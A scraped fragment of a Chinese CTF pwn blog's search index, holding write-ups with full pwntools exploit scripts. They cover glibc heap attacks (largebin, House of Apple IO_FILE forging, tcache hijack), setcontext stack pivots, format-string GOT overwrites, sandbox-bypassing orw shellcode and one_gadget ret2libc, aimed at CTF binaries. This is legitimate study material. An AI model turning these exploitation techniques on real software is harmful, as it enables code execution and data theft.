   0x7fe165955a87 &amp;lt;setcontext+87&amp;gt;     mov    r14, qword ptr [rdx + 0x58]
   0x7fe165955a8b &amp;lt;setcontext+91&amp;gt;     mov    r15, qword ptr [rdx + 0x60]
   0x7fe165955a8f &amp;lt;setcontext+95&amp;gt;     test   dword ptr fs:[0x48], 2
   0x7fe165955a9b &amp;lt;setcontext+107&amp;gt;    je     setcontext+294                &amp;lt;setcontext+294&amp;gt;
   ......
   0x7fe165955b56 &amp;lt;setcontext+294&amp;gt;    mov    rcx, qword ptr [rdx + 0xa8]
   0x7fe165955b5d &amp;lt;setcontext+301&amp;gt;    push   rcx
   0x7fe165955b5e &amp;lt;setcontext+302&amp;gt;    mov    rsi, qword ptr [rdx + 0x70]
   0x7fe165955b62 &amp;lt;setcontext+306&amp;gt;    mov    rdi, qword ptr [rdx + 0x68]
   0x7fe165955b66 &amp;lt;setcontext+310&amp;gt;    mov    rcx, qword ptr [rdx + 0x98]
   0x7fe165955b6d &amp;lt;setcontext+317&amp;gt;    mov    r8, qword ptr [rdx + 0x28]
   0x7fe165955b71 &amp;lt;setcontext+321&amp;gt;    mov    r9, qword ptr [rdx + 0x30]
   0x7fe165955b75 &amp;lt;setcontext+325&amp;gt;    mov    rdx, qword ptr [rdx + 0x88]
   0x7fe165955b7c &amp;lt;setcontext+332&amp;gt;    xor    eax, eax
   0x7fe165955b7e &amp;lt;setcontext+334&amp;gt;    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;ROPgadget --binary &#39;/home/tutu/桌面/pwn/houseofcat/libc.so.6&#39; --opcode 488ba2a00000&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;其他好用的gadgets&#34;&gt;其他好用的gadgets&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;通过rdi控制rax，并call&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;0x000000000015d65a : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]
0x000000000015d5c1 : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x18]
0x00000000001673c9 : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x20]
0x000000000015d50c : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 8]
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;通过rdx控制rsp&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;0x000000000005a170 : mov rsp, rdx ; ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;通过rdi控制rdx，通过rax控制rsp，调用rdx（也可以栈迁移）&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;0x00000000001675b0 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;找flag&#34;&gt;找flag&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;find / -name *flag*&lt;/code&gt;&lt;/p&gt;
">琐碎知识点</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/house-of-apple/"" data-c="
          &lt;p&gt;该打法一次largebin attack就能拿到shell，不可不称nb，据说高版本基本通杀，更是nb中的nb，另外还有一条_IO_obstack_jumps链，例题详情见 litctf2024-heap2.35&lt;br&gt;
&lt;a href=&#34;https://bbs.kanxue.com/thread-273832.htm#msg_header_h2_0&#34;&gt;学习传送门&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;高版本230之后largebin-attack&#34;&gt;高版本(2.30之后)Largebin attack&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;if ((unsigned long) (size) &amp;lt; (unsigned long) chunksize_nomask (bck-&amp;gt;bk))
{
    fwd = bck;
    bck = bck-&amp;gt;bk;
    victim-&amp;gt;fd_nextsize = fwd-&amp;gt;fd;
    victim-&amp;gt;bk_nextsize = fwd-&amp;gt;fd-&amp;gt;bk_nextsize; // 1
    fwd-&amp;gt;fd-&amp;gt;bk_nextsize = victim-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victim; // 2
}
else
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;1.在largebin list中放入一个堆块A，并利用UAF等漏洞修改其内容为p64(0)*3 + p64(target_addr - 0x20)，也就是在bk_nextsize写入target_addr - 0x20&lt;/p&gt;
&lt;p&gt;2.释放一个大小略小于堆块A的堆块B进入到同一个largebin list，此时就会在target_addr中写入堆块B的地址&lt;br&gt;
原理解释：源码中的bck就是largebin list的头部，而bck-&amp;gt;fd就指向了其中size最小的堆块，将源码中1带入2中得：fwd-&amp;gt;fd-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victim，又在之前有fwd = bck，fwd-&amp;gt;fd就是largebin list头部的fd，而此largebin list在加入堆块B之前只有堆块A，因此fwd-&amp;gt;fd-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victim就是堆块A的bk_nextsize-&amp;gt;fd_nextsize也就是target_addr处写入了victim也就是堆块B的地址。&lt;/p&gt;
&lt;h1 id=&#34;house-of-apple&#34;&gt;House of apple&lt;/h1&gt;
&lt;p&gt;攻击的调用链：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;_IO_wfile_overflow --&amp;gt; _IO_wdoallocbuf --&amp;gt; _IO_WDOALLOCATE
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;攻击思路&#34;&gt;攻击思路：&lt;/h2&gt;
&lt;p&gt;先利用Largebin attack劫持_IO_list_all结构体，将文件流劫持到堆上后，需要对fp的进行一些设置，如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格&lt;/li&gt;
&lt;li&gt;vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可&lt;/li&gt;
&lt;li&gt;_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A&lt;/li&gt;
&lt;li&gt;_wide_data-&amp;gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0&lt;/li&gt;
&lt;li&gt;_wide_data-&amp;gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0&lt;/li&gt;
&lt;li&gt;_wide_data-&amp;gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B&lt;/li&gt;
&lt;li&gt;_wide_data-&amp;gt;_wide_vtable-&amp;gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;edit(8, b&#39;A&#39; * 0x10 + p32(0xfffff7f5) + b&#39;;sh\x00&#39;) # _flags标志位（int类型的）

fake_io_file = p64(0)*2 + p64(1) + p64(2)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr + 0x100)  # _wide_data (A)
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr + 0x200)  # B
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b&#39;\0&#39;) + p64(0)*13 + p64(system)  # C
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果有能力直接改写stderr等结构体可以直接这样构造(就是可以直接改_flag位)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fake_file = flat({
       0x0: b&amp;quot;  sh;&amp;quot;,
       0x28: libc_base + libc.symbols[&#39;system&#39;],
       0x88: libc_base + libc.symbols[&#39;_environ&#39;]-0x10,
       0xa0: libc_base+libc.symbols[&#39;_IO_2_1_stderr_&#39;]-0x40,   # _wide_data
       0xD8: libc_base + libc.symbols[&#39;_IO_wfile_jumps&#39;], # jumptable
   }, filler=b&amp;quot;\x00&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者需要打orw&lt;br&gt;
magic gadgets:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;svcudp_reply+26&amp;gt;:  mov  rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:  mov  rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:  lea  r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:  mov  DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:  mov  rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:  call  QWORD PTR [rax+0x28]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将C的地址改为magic gadgets，此时执行到C时的rdi就是fp的地址，此时可以设计rbp的值和rax的值，[rax+0x28]设置为leave ret，就相当于一个栈迁移，在堆块中设置好orw便可构造执行&lt;/p&gt;
">House of apple</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/dasctf-2024-shu-qi-tiao-zhan-sai/"" data-c="
          &lt;h1 id=&#34;spring_board&#34;&gt;spring_board&lt;/h1&gt;
&lt;p&gt;阅读程序发现是有五次的非栈上格式化字符串漏洞，用来计数的i变量位于栈上，只有五次的话要做到泄露libc地址，栈地址并且做到修改printf的got表为system不太够用，所以可以用格式化字符串漏洞把i变量给改掉，从而达到重置次数的目的，其他的思路和非栈上格式化字符串一样&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./pwn&amp;quot;)
# p = remote(&#39;node5.buuoj.cn&#39;,27012)
elf = ELF(&amp;quot;./pwn&amp;quot;)

# stack libc
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;%11$p-%9$p&amp;quot;)
p.recvuntil(&amp;quot;0x&amp;quot;)
stack = int(p.recv(12),16)
ebp = stack - 232
count = ebp - 4
print(&amp;quot;stack = &amp;quot;,hex(stack))
print(&amp;quot;stack = &amp;quot;,hex(ebp))
p.recvuntil(&amp;quot;0x&amp;quot;)
libc_base = int(p.recv(12),16) - 133184
print(&amp;quot;main = &amp;quot;,hex(libc_base))
sys = libc_base + 0x0000000000453A0
print(&amp;quot;sys = &amp;quot;,hex(sys))
cc = (count) &amp;amp; 0xffff
payload = b&#39;%&#39; + str(cc).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%11$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

payload = b&#39;%c%37$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)


printf_got = 0x601028

s1 = (ebp + 5*8) &amp;amp; 0xffff
s11 = s1 + 2
payload = b&#39;%&#39; + str(s1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%25$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;%4136c%39$hn&amp;quot;)

payload = b&#39;%c%37$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

payload = b&#39;%&#39; + str(s11).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%25$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;%96c%39$hhn&amp;quot;)

payload = b&#39;%c%37$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

s2 = (ebp + 8*8) &amp;amp; 0xffff
s22 = s2 + 2
payload = b&#39;%&#39; + str(s2).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%25$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;%4138c%39$hn&amp;quot;)

payload = b&#39;%c%37$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

payload = b&#39;%&#39; + str(s22).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%25$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;%96c%39$hhn&amp;quot;)

payload = b&#39;%c%37$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

# gdb.attach(p)
# pause()

x1 = sys &amp;amp; 0xffff
payload = b&#39;%&#39; + str(x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%13$hn&#39;
x2 = (sys &amp;gt;&amp;gt; 16) &amp;amp; 0xffff
payload += b&#39;%&#39; + str(0x10000 + x2 - x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%16$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

p.sendafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;/bin/sh\x00&amp;quot;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;magicbook&#34;&gt;magicbook&lt;/h1&gt;
&lt;p&gt;用Largebin attack修改读入的数据长度，开了沙盒禁用了execve，就是个栈溢出打orw&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

r = process(&amp;quot;./pwn&amp;quot;)
# p = remote(&#39;node5.buuoj.cn&#39;,27012)
elf = ELF(&amp;quot;./pwn&amp;quot;)
libc = elf.libc

def choice(cmd):
	r.sendlineafter(&amp;quot;choice:\n&amp;quot;,str(cmd).encode())

def add(size):
    choice(1)
    r.recvuntil(b&#39;need?\n&#39;)
    r.sendline(str(size).encode())


def delete(idx,content = b&#39;&#39;,flag = -1):
    choice(2)
    r.recvuntil(b&#39;delete?\n&#39;)
    r.sendline(str(idx).encode())
    if(flag==-1):
    	r.sendlineafter(&amp;quot;deleted?(y/n)\n&amp;quot;,b&#39;n&#39;)
    else:
    	r.sendlineafter(&amp;quot;deleted?(y/n)\n&amp;quot;,b&#39;y&#39;)
    	r.sendlineafter(&amp;quot;write?\n&amp;quot;,b&#39;0&#39;)
    	r.sendlineafter(&amp;quot;content: \n&amp;quot;,content)


def edit(pay):
    choice(3)
    r.recvuntil(b&#39;story!\n&#39;)
    r.sendline(pay)

r.recvuntil(b&#39;gift: &#39;)

book = int(r.recv(14),16) - 0x4010 + 0x4050
add(0x460)#0
add(0x20)#1
add(0x450)#2

delete(0)
add(0x500)#3

pay = p64(0xff)*2 + p64(book - 0x20)
delete(2,pay,0)

add(0x500)#4
print(&amp;quot;book = &amp;quot;,hex(book))

bss_base = book - 16464
bss = book + 0x600

# ----------------------------------------------------
puts_plt = bss_base + 0x000000000001140
puts_got = bss_base + 0x000000000003F88
main_addr = bss_base + 0x0000000000015F9
rdi_ret = bss_base + 0x0000000000001863
rsi_r15_ret = bss_base + 0x0000000000001861
vuln = bss_base + 0x15E6


payload1 = b&#39;a&#39;*0x28 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)
edit(payload1)
libc.address = u64(r.recv(6).ljust(8,b&#39;\x00&#39;))-libc.symbols[&#39;puts&#39;]
print(&#39;libc:&#39;,hex(libc.address))
rdx_r12_ret = libc.address+0x000000000011f2e7
# gdb.attach(r)
payload2 = b&#39;a&#39;*0x28 + p64(rdi_ret) + p64(0) + p64(rsi_r15_ret) + p64(bss)*2 + p64(rdx_r12_ret) + p64(0x100)*2 + p64(libc.symbols[&#39;read&#39;])
payload2 += p64(rdi_ret) + p64(bss) + p64(rsi_r15_ret) + p64(0)*2 + p64(rdx_r12_ret) + p64(0)*2 + p64(libc.symbols[&#39;open&#39;])
payload2 += p64(rdi_ret) + p64(3) + p64(rsi_r15_ret) + p64(bss)*2 + p64(rdx_r12_ret) + p64(0x100)*2 + p64(libc.symbols[&#39;read&#39;])
payload2 += p64(rdi_ret) + p64(bss) + p64(libc.symbols[&#39;puts&#39;])
r.send(payload2)
r.send(&#39;./flag\x00&#39;)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
">DASCTF 2024暑期挑战赛</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ciscn_2021_silverwolf/"" data-c="
          &lt;p&gt;2.27的libc，开了沙盒得打orw，程序存在uaf漏洞，只能对一个chunk进行操作，并且还有大小限制，不能超过0x78，攻击思路：&lt;/p&gt;
&lt;p&gt;1.泄露libc和heap基地址:由于有大小限制，所以需要劫持tcache_perthread_struct 结构体，把0x250大小的count修改为7，释放劫持到该结构体的chunk到unsortedbins，从而泄露libc基地址&lt;br&gt;
2.劫持tcache_perthread_struct 结构体，在堆中布置orw的ROPchain和flag字符串&lt;br&gt;
3.劫持free hook为setcontext+53，从而控制rsp到布置的orw上（setcontext感觉就相当于布置rsp的值然后ret，从而实现控制执行流）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
import sys
import os
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

io = process(&#39;./pwn&#39;)
# io = remote(&#39;node4.anna.nssctf.cn&#39;,28025)
libc = ELF(&#39;libc-2.27.so&#39;)


def choice(idx):
    io.recvuntil(b&#39;choice: &#39;)
    io.sendline(str(idx))


def add(size):
    choice(1)
    io.sendlineafter(b&#39;Index: &#39;, str(0))
    io.sendlineafter(b&#39;Size: &#39;, str(size))


def edit(content):
    choice(2)
    io.sendlineafter(b&#39;Index: &#39;, str(0))
    io.sendlineafter(b&#39;Content: &#39;, content)


def free():
    choice(4)
    io.sendlineafter(b&#39;Index: &#39;, str(0))


def show():
    choice(3)
    io.sendlineafter(b&#39;Index: &#39;, str(0))
# 泄露libc,heap
add(0x78)
free()
show()
heap_base = u64(io.recvuntil(b&#39;\x55&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 4512
print(&#39;heap_base&#39;,hex(heap_base))
tcache = heap_base
edit(p64(tcache))
add(0x78)
add(0x78)
edit(p64(0)*4 + b&#39;\x00&#39;*3 + b&#39;\x07&#39;)
free()
show()
libc_base = u64(io.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 4111520
print(&#39;libc_base&#39;,hex(libc_base))
edit(p64(0)*4 + b&#39;\x00&#39;*4)
free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]
flag_addr = heap_base + 0x1000

orw1 = heap_base + 0x3000
orw2 = heap_base + 0x3060

stack_pivot_1 = heap_base + 0x2000
stack_pivot_2 = heap_base + 0x20A0

payload = b&#39;\x00&#39; * 0x40
payload += p64(free_hook)  # 0x20
payload += p64(0)
payload += p64(flag_addr)
payload += p64(stack_pivot_1)
payload += p64(stack_pivot_2)
payload += p64(orw1)
payload += p64(orw2)

edit(payload)
# orw
# Open

orw = p64(pop_rdi) + p64(flag_addr)
orw += p64(pop_rax) + p64(2)
orw += p64(pop_rsi) + p64(0)
orw += p64(syscall) # open(&#39;./flag&#39;)

# Read

orw += p64(pop_rdi) + p64(3)
orw += p64(pop_rsi) + p64(orw1)
orw += p64(pop_rdx) + p64(0x30)
orw += p64(read) # read(3, orw1, 0x30)

# Write

orw += p64(pop_rdi) + p64(1)
orw += p64(write) # write(1, orw1, 0x30)

add(0x18)
edit(p64(setcontext))
add(0x38)
edit(&#39;./flag&#39;)
add(0x68)
edit(orw[:0x60])
add(0x78)
edit(orw[0x60:])
add(0x58)
edit(p64(orw1) + p64(ret))
add(0x48)
free()

gdb.attach(io)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">CISCN_2021_silverwolf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/chun-qiu-bei-xia-ji-sai/"" data-c="
          &lt;h1 id=&#34;shuffled_execution&#34;&gt;Shuffled_Execution&lt;/h1&gt;
&lt;p&gt;就是写个shehllcode，但是有个随机交换字节，可以在前面输入0x00绕过strlen从而绕过随机交换，后面就是沙盒orw，&lt;img src=&#34;https://l1u66.github.io//post-images/1720350450536.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
用openat，mmap/preadv2 ，writev绕过&lt;br&gt;
&lt;code&gt;preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0)&lt;/code&gt;&lt;br&gt;
第二个参数实际上是一个结构体，包含着写入地址和读取长度，就相当于原来read的二参和三参&lt;br&gt;
&lt;code&gt;writev(fd=1, iovec=0x1337090, count=1)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
import ctypes
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
	
# r = remote(&amp;quot;8.147.132.12&amp;quot;,42557)
r = process(&amp;quot;./vuln&amp;quot;)
gdb.attach(r)

p = b&#39;\x00PP&#39;
shellcode = asm(&#39;&#39;&#39;
		/* openat(fd=-0x64, file=&#39;flag&#39;, oflag=0) */
        add rax, 0x62
        mov r12, rax
        mov rsi, rax
        mov rdi, -0x64
        /* call openat() */
        mov rax, 0x101 /* 0x101 */
        syscall
        /* preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0) */
        mov rdi, 3
        mov rdx, 0x1
        add r12, 0x15
        mov rsi, r12
        /* call preadv2() */
        mov rax, 327
        syscall
        /* writev(fd=1, iovec=0x1337090, count=1) */
        mov rdi, 1
        mov rdx, 0x1
        /* call writev() */
        mov rax, 0x14
        syscall
&#39;&#39;&#39;)

p += shellcode + b&#39;\x00&#39; * 0x10 + b&#39;flag\x00&#39; + b&#39;\x00&#39; * 0x10 + p64(0x1337090) + p64(0x100)
r.sendlineafter(b&#39;entrance&#39;, p)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下面是用的测信道代替的write，但是远端连接可能不太稳定，一直没通（比赛的时候不知有writev函数，悲）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#openat(0xffffff9c,flag,0)
#pread(3,0x114514000,0x100,0)

payload = asm(&#39;&#39;&#39;
	mov rbp,0x1337800
	mov rsp,rbp
	&#39;&#39;&#39;)
payload += asm(shellcraft.openat(0xffffff9c,b&amp;quot;flag&amp;quot;,0))
payload += asm(shellcraft.mmap(0x1337000,0x100,1,1,&#39;eax&#39;,0))
payload += asm(&#39;&#39;&#39;
	mov rsi,rax
	&#39;&#39;&#39;)

def exp(dis,char):
	pay = payload	
	pay += asm(&#39;&#39;&#39;
		mov dl, byte ptr [rsi+{}]
        mov bl, {}
        cmp bl,dl
        jz loop
        mov rax,60
		mov rdi,0x0
        syscall
        loop:
        jmp loop
	&#39;&#39;&#39;.format(dis,char))
	print(len(pay))#87 
	print(pay)
	p.sendafter(&amp;quot;entrance.\n&amp;quot;,pay)
	
flag = &amp;quot;&amp;quot;
# p = remote(&amp;quot;8.147.132.12&amp;quot;,42557)
# p = process(&amp;quot;./vuln&amp;quot;)
# gdb.attach(p)
# exp(0,0)
# p.interactive()

for i in range(len(flag),50):
	sleep(1)
	print(&amp;quot;flag : {}&amp;quot;.format(flag))
	for j in range(0x20,0x80):
		# p = remote(&amp;quot;8.147.132.12&amp;quot;,42557)
		p = process(&amp;quot;./vuln&amp;quot;)
		try:
			exp(i,j)
			p.recvline(timeout=1)
			flag += chr(j)
			print(&amp;quot;flag : &amp;quot;,flag)
			log.success(&amp;quot;{} pos : {} success&amp;quot;.format(i,chr(j)))
			p.close()
			break
		except:           
			p.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;stdout&#34;&gt;stdout&lt;/h1&gt;
&lt;p&gt;这不就是ciscn2024东北赛区的原题？？？&lt;br&gt;
输出被设置为全缓冲区，只有当缓冲区被填满时才会进行I/O操作&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void __fastcall init()
{
  setvbuf(stdout, 0LL, 0, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里介绍下setvbuf函数，它有三种mode：&lt;br&gt;
全缓冲：0，缓冲区满 或 调用fflush() 后输出缓冲区内容。&lt;br&gt;
行缓冲：1，缓冲区满 或 遇到换行符 或 调用fflush() 后输出缓冲区内容。&lt;br&gt;
无缓冲：2，直接输出。&lt;/p&gt;
&lt;p&gt;也可以通过一下方式进行手动刷新缓冲区从而输出缓冲区中的内容：&lt;br&gt;
1.显式调用fflush函数&lt;br&gt;
2.流被关闭（调用fclose）&lt;br&gt;
3.程序正常结束（调用exit）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__int64 extend()
{
  __int64 result; // rax
  char s[8]; // [rsp+0h] [rbp-30h] BYREF
  __int64 v2; // [rsp+8h] [rbp-28h]
  __int64 v3; // [rsp+10h] [rbp-20h]
  __int64 v4; // [rsp+18h] [rbp-18h]
  int v5; // [rsp+28h] [rbp-8h]
  int v6; // [rsp+2Ch] [rbp-4h]

  puts(&amp;quot;Just to increase the number of got tables&amp;quot;);
  *(_QWORD *)s = &#39;!olleh&#39;;
  v2 = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v6 = strlen(s);
  if ( strcmp(s, &amp;quot;hello!&amp;quot;) )
    exit(0);
  puts(&amp;quot;hello!&amp;quot;);
  srand(1u);
  v5 = 0;
  result = (unsigned int)(rand() % 16);
  v5 = result;
  return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;程序其他部分包括vuln extend，vuln目的是进行更大长度的栈溢出，而extend是为了向输出缓冲区填入更多内容加快填满输出缓冲区，因为直接通过输出一个地址来填满输出缓冲区会由于连接不稳定而无法打通远程（悲，同样由于远端连接不稳定没通）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
# context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
context.log_level = &#39;debug&#39;

p = process(&#39;./pwn&#39;)
# p = remote(&#39;8.147.134.120&#39;, 23067)
# elf = ELF(&#39;pwn&#39;)
# libc = ELF(&#39;libc-2.31.so&#39;)

puts_plt = 0x0000000004010B0
puts_got = 0x000000000404018
backdoor = 0x40125D
pop_rdi = 0x00000000004013d3
pop_rsi_r15 = 0x00000000004013d1
extend = 0x401287
ret = 0x00000000040136E

pay = b&#39;a&#39;*0x50 + p64(0xdeadbeaf) + p64(0x40125D)
p.send(pay)
# gdb.attach(p)
# leak libc
for i in range(3):#1748
   payload = b&#39;a&#39; * (0x20) + b&#39;deadbeef&#39; + p64(ret) + p64(extend) * 54 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(backdoor)
   p.send(payload)

libc_base = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x875a0
p.recv()
print(&#39;libc_base = &#39; + hex(libc_base))

# ret2libc
&#39;&#39;&#39;
0xe6aee execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe6af1 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe6af4 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

&#39;&#39;&#39;
one_gadget = [0xe6aee, 0xe6af1, 0xe6af4]
pop_rdx_r12 = libc_base + 0x000000000011c1e1
print(hex(pop_rdx_r12))
one = libc_base + one_gadget[1]
print(hex(one))
# gdb.attach(p)
payload = b&#39;a&#39; * 0x20 + b&#39;deadbeef&#39; + p64(pop_rdx_r12) + p64(0)*2 +  p64(one)
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;savetheprincess&#34;&gt;SavethePrincess&lt;/h1&gt;
&lt;p&gt;不会写，待补充&lt;/p&gt;
">春秋杯夏季赛</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/kali-ci-pan-bu-zu-wen-ti/"" data-c="
